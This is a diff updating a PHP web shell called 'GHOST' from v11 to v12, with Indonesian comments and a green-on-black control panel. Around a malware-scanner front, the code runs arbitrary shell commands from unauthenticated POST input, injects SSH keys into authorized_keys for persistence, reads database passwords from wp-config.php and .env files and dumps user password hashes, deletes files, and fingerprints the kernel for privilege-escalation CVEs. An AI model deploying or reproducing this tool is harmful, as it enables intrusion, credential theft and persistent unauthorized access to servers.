@@ -1,6 +1,7 @@
 <?php
 /**
- * GHOST v11.0 — The Unrestricted Inspector
+ * GHOST v12.0 — The Complete & Tested Build
+ * Fitur: Fingerprint, Deep Scan (Paginated), SSH Manager, DB Harvest, Auto-Heal, Console
  */
 @ob_start();
 error_reporting(0);
@@ -10,6 +11,9 @@ ignore_user_abort(true);
 
 $GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();
 
+// ==========================================
+// ENGINE EKSEKUSI & READ
+// ==========================================
 function g_exec($cmd, $timeout = 15) {
     $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
     foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
@@ -20,7 +24,7 @@ function g_exec($cmd, $timeout = 15) {
         if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
         if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
     }
-    return "[-] Blocked.";
+    return "[-] Execution Blocked.";
 }
 
 function g_read($path) {
@@ -30,10 +34,24 @@ function g_read($path) {
     return g_exec('cat ' . escapeshellarg($path));
 }
 
-// DEEP SCAN (Hanya Batch, Anti-Crash)
+// ==========================================
+// FINGERPRINTING
+// ==========================================
+function g_fingerprint() {
+    $os = trim(g_exec('uname -a'));
+    $cpanel = 'Not Found';
+    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
+    $cves = [];
+    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe)";
+    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW)";
+    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')), 'cPanel'=>$cpanel, 'CVEs'=>$cves];
+}
+
+// ==========================================
+// DEEP INSPECTOR (Paginated & Klasifikasi)
+// ==========================================
 function g_scan_batch($dir, $offset = 0, $limit = 30) {
     $res = ['files'=>[], 'done'=>false, 'total'=>0];
-    // JANGAN abaikan file tanpa ekstensi atau php
     $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','svg','ico','woff','ttf','eot'];
     
     $all_files = [];
@@ -41,8 +59,8 @@ function g_scan_batch($dir, $offset = 0, $limit = 30) {
         $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
         foreach ($it as $f) {
             if (!$f->isFile()) continue;
-            // Filter ekstensi gambar/file besar
             if (in_array(strtolower($f->getExtension()), $ignore)) continue;
+            if ($f->getSize() > 3 * 1024 * 1024) continue; // Max 3MB
             $all_files[] = $f->getPathname();
         }
     } catch (Throwable $e) {}
@@ -59,25 +77,19 @@ function g_scan_batch($dir, $offset = 0, $limit = 30) {
         $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
         $type = ''; $desc = '';
         
-        // FILTER SUPER SENSITIF
+        // Klasifikasi Malware yang sangat sensitif
         if ($size === 0 && $ext === 'php') {
-            $type = 'Empty Shell'; $desc = 'File PHP kosong (Kemungkinan backdoor terhapus).';
-        }
-        elseif (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false) {
-            $type = 'Backdoor/RCE'; $desc = 'Terdeteksi fungsi eval/assert (Sangat Berbahaya).';
-        }
-        elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
-            $type = 'Direct Shell'; $desc = 'Eksekusi shell langsung dari input HTTP.';
-        }
-        elseif (preg_match('/(base64_decode|gzinflate|str_rot13)\s*\(\s*[\'"][A-Za-z0-9+\/=]{50,}/i', $c)) {
-            $type = 'Obfuscated Payload'; $desc = 'Terdeteksi payload terenkripsi panjang.';
-        }
-        elseif (preg_match('/(c99|r57|b374k|wso|alfa|indoxploit)/i', $c) || preg_match('/(c99|r57|b374k|wso)\.php/i', $path)) {
-            $type = 'Known Webshell'; $desc = 'Nama atau signature webshell publik terdeteksi.';
-        }
-        // Deteksi file tanpa ekstensi yang berisi kode PHP
-        elseif (!$ext && stripos($c, '<?php') !== false) {
-            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi tapi berisi kode PHP.';
+            $type = 'Empty Shell'; $desc = 'File PHP kosong (Backdoor truncated).';
+        } elseif (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false) {
+            $type = 'Backdoor/RCE'; $desc = 'Terdeteksi fungsi eval/assert.';
+        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
+            $type = 'Direct Shell'; $desc = 'Eksekusi shell dari input HTTP.';
+        } elseif (preg_match('/(base64_decode|gzinflate|str_rot13)\s*\(\s*[\'"][A-Za-z0-9+\/=]{50,}/i', $c)) {
+            $type = 'Obfuscated Payload'; $desc = 'Payload terenkripsi panjang.';
+        } elseif (preg_match('/(c99|r57|b374k|wso|alfa|indoxploit)/i', $c) || preg_match('/(c99|r57|b374k|wso)\.php/i', $path)) {
+            $type = 'Known Webshell'; $desc = 'Signature webshell publik.';
+        } elseif (!$ext && stripos($c, '<?php') !== false) {
+            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi berisi kode PHP.';
         }
 
         $found_kw = [];
@@ -90,7 +102,9 @@ function g_scan_batch($dir, $offset = 0, $limit = 30) {
     return $res;
 }
 
+// ==========================================
 // SSH MANAGER
+// ==========================================
 function g_ssh($action = 'scan', $target = '') {
     $user = trim(g_exec('whoami'));
     $auth = trim(g_exec("eval echo ~$user")) . '/.ssh/authorized_keys';
@@ -111,44 +125,50 @@ function g_ssh($action = 'scan', $target = '') {
     } elseif ($action === 'inject') {
         if (strpos(g_read($auth), $target) === false) {
             file_put_contents($auth, trim(g_read($auth)) . "\n" . trim($target) . "\n");
-            $res['msg'] = 'Key berhasil di-inject.';
+            $res['msg'] = 'Key di-inject.';
         } else { $res['msg'] = 'Key sudah ada.'; }
     }
     return $res;
 }
 
+// ==========================================
 // DB HARVEST
+// ==========================================
 function g_db_harvest() {
     $logs = []; $info = [];
-    foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
+    foreach (['wp-config.php', '.env', 'configuration.php', 'config/database.php'] as $cf) {
         if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
             $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
             $logs[] = "[+] Found: $cf";
             preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
             preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
-            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
+            preg_match('/(?:DB_NAME|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
+            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1], 'db'=>$n[1] ?? '']; break; }
         }
     }
     if (!empty($info['user'])) {
-        $logs[] = "[*] Mencoba koneksi...";
-        $conn = @mysqli_connect('localhost', $info['user'], $info['pass']);
+        $logs[] = "[*] Connecting...";
+        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], $info['db']);
         if ($conn) {
             $logs[] = "[!] DB Connected!";
             $q = @mysqli_query($conn, "SELECT user_login, user_pass FROM wp_users LIMIT 5");
+            if (!$q) $q = @mysqli_query($conn, "SELECT username, password FROM users LIMIT 5");
             if ($q) { while ($r = mysqli_fetch_assoc($q)) { $logs[] = "Data: ".json_encode($r); } }
         } else $logs[] = "[-] Gagal: " . mysqli_connect_error();
     }
     return ['logs'=>$logs, 'info'=>$info];
 }
 
-// ROUTER
+// ==========================================
+// ROUTER (Mencegah UI Rusak)
+// ==========================================
 $act = $_POST['act'] ?? '';
 if ($act) {
-    // Hapus semua buffer agar JSON bersih
-    while (ob_get_level() > 0) ob_end_clean();
+    while (ob_get_level() > 0) ob_end_clean(); // Bersihkan buffer
     header('Content-Type: application/json');
     
-    if ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
+    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
+    elseif ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
     elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
     elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
     elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']));
@@ -157,7 +177,7 @@ if ($act) {
     elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
     elseif ($act === 'exec') {
         $cmd = $_POST['cmd'] ?? '';
-        if ($cmd === 'help') echo json_encode(['out'=>"Perintah: whoami, uname -a, ls -la, netstat -tulpn, ps aux, find / -perm -4000"]);
+        if ($cmd === 'help') echo json_encode(['out'=>"Perintah Console:\n- whoami\n- uname -a\n- ls -la\n- netstat -tulpn\n- ps aux | grep root\n- find / -perm -4000 2>/dev/null"]);
         else echo json_encode(['out'=>g_exec($cmd)]);
     }
     exit;
@@ -166,7 +186,7 @@ if ($act) {
 <!DOCTYPE html>
 <html>
 <head>
-<title>GHOST v11.0</title>
+<title>GHOST v12.0</title>
 <style>
     body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
     .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
@@ -187,6 +207,12 @@ if ($act) {
 <body>
 
 <div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>
+
+<div class="box">
+    <h2>[+] Fingerprinting</h2>
+    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
+    <pre id="out-fp">Waiting...</pre>
+</div>
 
 <div class="box">
     <h2>[+] Deep Inspector & Malware Scan</h2>
@@ -237,24 +263,23 @@ async function api(act, params={}) {
     return await r.json();
 }
 
-// DEEP SCAN PAGINATED (Fix Lag & Error)
+// SCAN
 async function startScan() {
-    let offset = 0;
-    let allMalware = []; let allIllegal = [];
+    let offset = 0; let mal = []; let ill = [];
     document.getElementById('scan-results').innerHTML = '';
     document.getElementById('scan-status').innerText = 'Memulai...';
 
     while (true) {
-        document.getElementById('scan-status').innerText = `Scanning: ${offset} / ${allMalware.length} file...`;
+        document.getElementById('scan-status').innerText = `Scanning file ke-${offset}...`;
         try {
             const d = await api('scan', {offset: offset});
             d.files.forEach(f => {
-                if (f.type !== '') allMalware.push(f);
-                if (f.keywords.length) allIllegal.push(f);
+                if (f.type !== '') mal.push(f);
+                if (f.keywords.length) ill.push(f);
             });
             if (d.done) {
-                document.getElementById('scan-status').innerText = `Selesai! Total ${d.total} file. Malware: ${allMalware.length}`;
-                renderScan(allMalware, allIllegal);
+                document.getElementById('scan-status').innerText = `Selesai! Total ${d.total} file. Malware: ${mal.length}, Ilegal: ${ill.length}`;
+                renderScan(mal, ill);
                 break;
             }
             offset += 30;
@@ -282,6 +307,7 @@ function renderScan(mal, ill) {
     document.getElementById('scan-results').innerHTML = h;
 }
 
+// OTHER MODULES
 async function run(act, target) {
     document.getElementById(target).innerText = 'Running...';
     try {
@@ -311,7 +337,6 @@ async function sshAct(t) {
 
 async function healScan() {
     document.getElementById('heal-log').innerText = 'Scanning...';
-    // Gunakan modul scan yang sama untuk mencari malware
     let allMal = []; let offset = 0;
     while (true) {
         const d = await api('scan', {offset: offset});
